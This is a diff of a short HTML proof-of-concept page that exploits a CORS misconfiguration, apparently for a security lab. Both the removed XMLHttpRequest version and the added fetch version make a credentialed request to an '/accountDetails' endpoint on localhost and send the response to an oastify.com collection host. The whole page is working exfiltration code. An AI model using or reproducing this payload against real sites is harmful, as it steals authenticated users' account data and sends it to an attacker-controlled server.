@@ -2,13 +2,13 @@
 <html>
 <body>
 <script>
-var req = new XMLHttpRequest();
-req.onload = function() {
-    location = 'https://punbpgrgkec2x4wmf1d0xun3vu1lpbd0.oastify.com/?key=' + encodeURIComponent(this.responseText);
-};
-req.open('GET', 'https://localhost:7207/accountDetails', true);
-req.withCredentials = true;
-req.send();
+fetch('https://localhost:7207/accountDetails', {
+    credentials: 'include'
+})
+.then(res => res.text())
+.then(data => {
+    fetch('https://laz75c7c0asyd0civxtwdq3zbqhh58tx.oastify.com/?key=' + encodeURIComponent(data));
+});
 </script>
 </body>
 </html>
